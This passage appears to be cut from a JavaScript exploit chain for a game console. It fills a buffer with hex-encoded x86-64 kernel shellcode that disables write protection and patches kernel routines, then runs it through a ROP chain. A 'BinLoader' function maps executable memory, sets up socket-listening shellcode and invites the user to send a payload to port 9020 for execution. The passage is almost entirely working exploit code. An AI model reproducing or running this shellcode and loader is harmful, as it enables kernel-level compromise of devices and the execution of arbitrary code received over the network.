    patch_buffer_view[1] = 0xFE894800;
    patch_buffer_view[2] = 0x033D8D48;
    patch_buffer_view[3] = 0x0F000000;
    patch_buffer_view[4] = 0x4855C305;
    patch_buffer_view[5] = 0x8B48E589;
    patch_buffer_view[6] = 0x95E8087E;
    patch_buffer_view[7] = 0xE8000000;
    patch_buffer_view[8] = 0x00000175;
    patch_buffer_view[9] = 0x033615FF;
    patch_buffer_view[10] = 0x8B480000;
    patch_buffer_view[11] = 0x0003373D;
    patch_buffer_view[12] = 0x3F8B4800;
    patch_buffer_view[13] = 0x74FF8548;
    patch_buffer_view[14] = 0x3D8D48EB;
    patch_buffer_view[15] = 0x0000029D;
    patch_buffer_view[16] = 0xF9358B48;
    patch_buffer_view[17] = 0x48000002;
    patch_buffer_view[18] = 0x0322158B;
    patch_buffer_view[19] = 0x8B480000;
    patch_buffer_view[20] = 0x00D6E812;
    patch_buffer_view[21] = 0x8D480000;
    patch_buffer_view[22] = 0x00029F3D;
    patch_buffer_view[23] = 0x358B4800;
    patch_buffer_view[24] = 0x000002E4;
    patch_buffer_view[25] = 0x05158B48;
    patch_buffer_view[26] = 0x48000003;
    patch_buffer_view[27] = 0xB9E8128B;
    patch_buffer_view[28] = 0x48000000;
    patch_buffer_view[29] = 0x02633D8D;
    patch_buffer_view[30] = 0x8B480000;
    patch_buffer_view[31] = 0x0002BF35;
    patch_buffer_view[32] = 0x158B4800;
    patch_buffer_view[33] = 0x000002C8;
    patch_buffer_view[34] = 0xE8128B48;
    patch_buffer_view[35] = 0x0000009C;
    patch_buffer_view[36] = 0x7A3D8D48;
    patch_buffer_view[37] = 0x48000002;
    patch_buffer_view[38] = 0x02AA358B;
    patch_buffer_view[39] = 0x8B480000;
    patch_buffer_view[40] = 0x0002AB15;
    patch_buffer_view[41] = 0x128B4800;
    patch_buffer_view[42] = 0x00007FE8;
    patch_buffer_view[43] = 0x0185E800;
    patch_buffer_view[44] = 0xC35D0000;
    patch_buffer_view[45] = 0x6D3D8948;
    patch_buffer_view[46] = 0x48000002;
    patch_buffer_view[47] = 0x026E3D01;
    patch_buffer_view[48] = 0x01480000;
    patch_buffer_view[49] = 0x00026F3D;
    patch_buffer_view[50] = 0x3D014800;
    patch_buffer_view[51] = 0x00000270;
    patch_buffer_view[52] = 0x713D0148;
    patch_buffer_view[53] = 0x48000002;
    patch_buffer_view[54] = 0x02723D01;
    patch_buffer_view[55] = 0x01480000;
    patch_buffer_view[56] = 0x0002933D;
    patch_buffer_view[57] = 0x3D014800;
    patch_buffer_view[58] = 0x00000294;
    patch_buffer_view[59] = 0x653D0148;
    patch_buffer_view[60] = 0x48000002;
    patch_buffer_view[61] = 0x02663D01;
    patch_buffer_view[62] = 0x01480000;
    patch_buffer_view[63] = 0x0002873D;
    patch_buffer_view[64] = 0x3D014800;
    patch_buffer_view[65] = 0x00000288;
    patch_buffer_view[66] = 0x893D0148;
    patch_buffer_view[67] = 0x48000002;
    patch_buffer_view[68] = 0x028A3D01;
    patch_buffer_view[69] = 0x01480000;
    patch_buffer_view[70] = 0x00028B3D;
    patch_buffer_view[71] = 0x3D014800;
    patch_buffer_view[72] = 0x0000024C;
    patch_buffer_view[73] = 0x3D3D0148;
    patch_buffer_view[74] = 0xC3000002;
    patch_buffer_view[75] = 0xE5894855;
    patch_buffer_view[76] = 0x10EC8348;
    patch_buffer_view[77] = 0x24348948;
    patch_buffer_view[78] = 0x24548948;
    patch_buffer_view[79] = 0xED15FF08;
    patch_buffer_view[80] = 0x48000001;
    patch_buffer_view[81] = 0x4B74C085;
    patch_buffer_view[82] = 0x48C28948;
    patch_buffer_view[83] = 0x4840408B;
    patch_buffer_view[84] = 0x2F74C085;
    patch_buffer_view[85] = 0x28788B48;
    patch_buffer_view[86] = 0x243C3B48;
    patch_buffer_view[87] = 0x8B480A74;
    patch_buffer_view[88] = 0xC0854800;
    patch_buffer_view[89] = 0xECEB1D74;
    patch_buffer_view[90] = 0x18788B48;
    patch_buffer_view[91] = 0x74FF8548;
    patch_buffer_view[92] = 0x7F8B48ED;
    patch_buffer_view[93] = 0x7C3B4810;
    patch_buffer_view[94] = 0xE2750824;
    patch_buffer_view[95] = 0xFF1040C7;
    patch_buffer_view[96] = 0x48FFFFFF;
    patch_buffer_view[97] = 0x31107A8D;
    patch_buffer_view[98] = 0x31D231F6;
    patch_buffer_view[99] = 0xA515FFC9;
    patch_buffer_view[100] = 0x48000001;
    patch_buffer_view[101] = 0x5D10C483;
    patch_buffer_view[102] = 0x894855C3;
    patch_buffer_view[103] = 0xC0200FE5;
    patch_buffer_view[104] = 0xFFFF2548;
    patch_buffer_view[105] = 0x220FFFFE;
    patch_buffer_view[106] = 0x3D8B48C0;
    patch_buffer_view[107] = 0x000001C8;
    patch_buffer_view[108] = 0x909007C7;
    patch_buffer_view[109] = 0x47C79090;
    patch_buffer_view[110] = 0x48909004;
    patch_buffer_view[111] = 0x358B48B8;
    patch_buffer_view[112] = 0x000001AC;
    patch_buffer_view[113] = 0x08778948;
    patch_buffer_view[114] = 0x651047C7;
    patch_buffer_view[115] = 0xC73C8B48;
    patch_buffer_view[116] = 0x00251447;
    patch_buffer_view[117] = 0x47C70000;
    patch_buffer_view[118] = 0x89480018;
    patch_buffer_view[119] = 0x1C47C738;
    patch_buffer_view[120] = 0xB8489090;
    patch_buffer_view[121] = 0x7D358B48;
    patch_buffer_view[122] = 0x48000001;
    patch_buffer_view[123] = 0xC7207789;
    patch_buffer_view[124] = 0xC7482847;
    patch_buffer_view[125] = 0x47C70100;
    patch_buffer_view[126] = 0x0000002C;
    patch_buffer_view[127] = 0x778D48E9;
    patch_buffer_view[128] = 0x158B4834;
    patch_buffer_view[129] = 0x00000150;
    patch_buffer_view[130] = 0x89F22948;
    patch_buffer_view[131] = 0x8B483057;
    patch_buffer_view[132] = 0x00016B35;
    patch_buffer_view[133] = 0x568D4800;
    patch_buffer_view[134] = 0xD7294805;
    patch_buffer_view[135] = 0xC148FF89;
    patch_buffer_view[136] = 0x814808E7;
    patch_buffer_view[137] = 0x0000E9CF;
    patch_buffer_view[138] = 0x3E894800;
    patch_buffer_view[139] = 0x00000D48;
    patch_buffer_view[140] = 0x220F0001;
    patch_buffer_view[141] = 0x55C35DC0;
    patch_buffer_view[142] = 0x0FE58948;
    patch_buffer_view[143] = 0x2548C020;
    patch_buffer_view[144] = 0xFFFEFFFF;
    patch_buffer_view[145] = 0x48C0220F;
    patch_buffer_view[146] = 0x013A3D8B;
    patch_buffer_view[147] = 0x07C70000;
    patch_buffer_view[148] = 0x00C3C031;
    patch_buffer_view[149] = 0x353D8B48;
    patch_buffer_view[150] = 0xC7000001;
    patch_buffer_view[151] = 0xC3C03107;
    patch_buffer_view[152] = 0x3D8B4800;
    patch_buffer_view[153] = 0x00000130;
    patch_buffer_view[154] = 0xC03107C7;
    patch_buffer_view[155] = 0x8B4800C3;
    patch_buffer_view[156] = 0x00012B3D;
    patch_buffer_view[157] = 0x3107C700;
    patch_buffer_view[158] = 0x4800C3C0;
    patch_buffer_view[159] = 0x00A63D8B;
    patch_buffer_view[160] = 0x87C70000;
    patch_buffer_view[161] = 0x001F1E01;
    patch_buffer_view[162] = 0x9090F631;
    patch_buffer_view[163] = 0x1E0587C7;
    patch_buffer_view[164] = 0xC931001F;
    patch_buffer_view[165] = 0x87C79090;
    patch_buffer_view[166] = 0x001F1E09;
    patch_buffer_view[167] = 0x9090D231;
    patch_buffer_view[168] = 0x1E3E87C7;
    patch_buffer_view[169] = 0xC931001F;
    patch_buffer_view[170] = 0x0D489090;
    patch_buffer_view[171] = 0x00010000;
    patch_buffer_view[172] = 0xFFC0220F;
    patch_buffer_view[173] = 0x0000EF15;
    patch_buffer_view[174] = 0xC0200F00;
    patch_buffer_view[175] = 0xFFFF2548;
    patch_buffer_view[176] = 0x220FFFFE;
    patch_buffer_view[177] = 0x3D8B48C0;
    patch_buffer_view[178] = 0x000000DC;
    patch_buffer_view[179] = 0xC03107C7;
    patch_buffer_view[180] = 0x0D4800C3;
    patch_buffer_view[181] = 0x00010000;
    patch_buffer_view[182] = 0x5DC0220F;
    patch_buffer_view[183] = 0x737973C3;
    patch_buffer_view[184] = 0x5F6D6574;
    patch_buffer_view[185] = 0x70737573;
    patch_buffer_view[186] = 0x5F646E65;
    patch_buffer_view[187] = 0x73616870;
    patch_buffer_view[188] = 0x705F3265;
    patch_buffer_view[189] = 0x735F6572;
    patch_buffer_view[190] = 0x00636E79;
    patch_buffer_view[191] = 0x74737973;
    patch_buffer_view[192] = 0x725F6D65;
    patch_buffer_view[193] = 0x6D757365;
    patch_buffer_view[194] = 0x68705F65;
    patch_buffer_view[195] = 0x32657361;
    patch_buffer_view[196] = 0x73797300;
    patch_buffer_view[197] = 0x5F6D6574;
    patch_buffer_view[198] = 0x75736572;
    patch_buffer_view[199] = 0x705F656D;
    patch_buffer_view[200] = 0x65736168;
    patch_buffer_view[201] = 0x90900033;
    patch_buffer_view[202] = 0x00000000;
    patch_buffer_view[203] = 0x00000000;
    patch_buffer_view[204] = 0x000F88F0;
    patch_buffer_view[205] = 0x00000000;
    patch_buffer_view[206] = 0x002EF170;
    patch_buffer_view[207] = 0x00000000;
    patch_buffer_view[208] = 0x00018DF0;
    patch_buffer_view[209] = 0x00000000;
    patch_buffer_view[210] = 0x00018EF0;
    patch_buffer_view[211] = 0x00000000;
    patch_buffer_view[212] = 0x02654110;
    patch_buffer_view[213] = 0x00000000;
    patch_buffer_view[214] = 0x00097230;
    patch_buffer_view[215] = 0x00000000;
    patch_buffer_view[216] = 0x00402E60;
    patch_buffer_view[217] = 0x00000000;
    patch_buffer_view[218] = 0x01520108;
    patch_buffer_view[219] = 0x00000000;
    patch_buffer_view[220] = 0x01520100;
    patch_buffer_view[221] = 0x00000000;
    patch_buffer_view[222] = 0x00462D20;
    patch_buffer_view[223] = 0x00000000;
    patch_buffer_view[224] = 0x00462DFC;
    patch_buffer_view[225] = 0x00000000;
    patch_buffer_view[226] = 0x006259A0;
    patch_buffer_view[227] = 0x00000000;
    patch_buffer_view[228] = 0x006268D0;
    patch_buffer_view[229] = 0x00000000;
    patch_buffer_view[230] = 0x00625DC0;
    patch_buffer_view[231] = 0x00000000;
    patch_buffer_view[232] = 0x00626290;
    patch_buffer_view[233] = 0x00000000;
    patch_buffer_view[234] = 0x00626720;
    patch_buffer_view[235] = 0x00000000;
    //lock payload / call payload / release payload
    {
        chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
        chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
        chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
    }
    chain.run();
}

function BinLoader() {
    const payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
    const payload_loader = p.malloc32(0x1000);
    const loader_writer = payload_loader.backing;
    loader_writer[0] = 0x56415741;
    loader_writer[1] = 0x83485541;
    loader_writer[2] = 0x894818ec;
    loader_writer[3] = 0xc748243c;
    loader_writer[4] = 0x10082444;
    loader_writer[5] = 0x483c2302;
    loader_writer[6] = 0x102444c7;
    loader_writer[7] = 0x00000000;
    loader_writer[8] = 0x000002bf;
    loader_writer[9] = 0x0001be00;
    loader_writer[10] = 0xd2310000;
    loader_writer[11] = 0x00009ce8;
    loader_writer[12] = 0xc7894100;
    loader_writer[13] = 0x8d48c789;
    loader_writer[14] = 0xba082474;
    loader_writer[15] = 0x00000010;
    loader_writer[16] = 0x000095e8;
    loader_writer[17] = 0xff894400;
    loader_writer[18] = 0x000001be;
    loader_writer[19] = 0x0095e800;
    loader_writer[20] = 0x89440000;
    loader_writer[21] = 0x31f631ff;
    loader_writer[22] = 0x0062e8d2;
    loader_writer[23] = 0x89410000;
    loader_writer[24] = 0x2c8b4cc6;
    loader_writer[25] = 0x45c64124;
    loader_writer[26] = 0x05ebc300;
    loader_writer[27] = 0x01499848;
    loader_writer[28] = 0xf78944c5;
    loader_writer[29] = 0xbaee894c;
    loader_writer[30] = 0x00001000;
    loader_writer[31] = 0x000025e8;
    loader_writer[32] = 0x7fc08500;
    loader_writer[33] = 0xff8944e7;
    loader_writer[34] = 0x000026e8;
    loader_writer[35] = 0xf7894400;
    loader_writer[36] = 0x00001ee8;
    loader_writer[37] = 0x2414ff00;
    loader_writer[38] = 0x18c48348;
    loader_writer[39] = 0x5e415d41;
    loader_writer[40] = 0x31485f41;
    loader_writer[41] = 0xc748c3c0;
    loader_writer[42] = 0x000003c0;
    loader_writer[43] = 0xca894900;
    loader_writer[44] = 0x48c3050f;
    loader_writer[45] = 0x0006c0c7;
    loader_writer[46] = 0x89490000;
    loader_writer[47] = 0xc3050fca;
    loader_writer[48] = 0x1ec0c748;
    loader_writer[49] = 0x49000000;
    loader_writer[50] = 0x050fca89;
    loader_writer[51] = 0xc0c748c3;
    loader_writer[52] = 0x00000061;
    loader_writer[53] = 0x0fca8949;
    loader_writer[54] = 0xc748c305;
    loader_writer[55] = 0x000068c0;
    loader_writer[56] = 0xca894900;
    loader_writer[57] = 0x48c3050f;
    loader_writer[58] = 0x006ac0c7;
    loader_writer[59] = 0x89490000;
    loader_writer[60] = 0xc3050fca;
    
    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
    
    var pthread = p.malloc(0x10); {
        chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
        chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
    }
    
    chain.run();
    createPopUpMessage("<span style='color: red;'>♥</span> Bin Loader Ready <span style='color: red;'>♥</span><br>Send A Payload To Port 9020");
}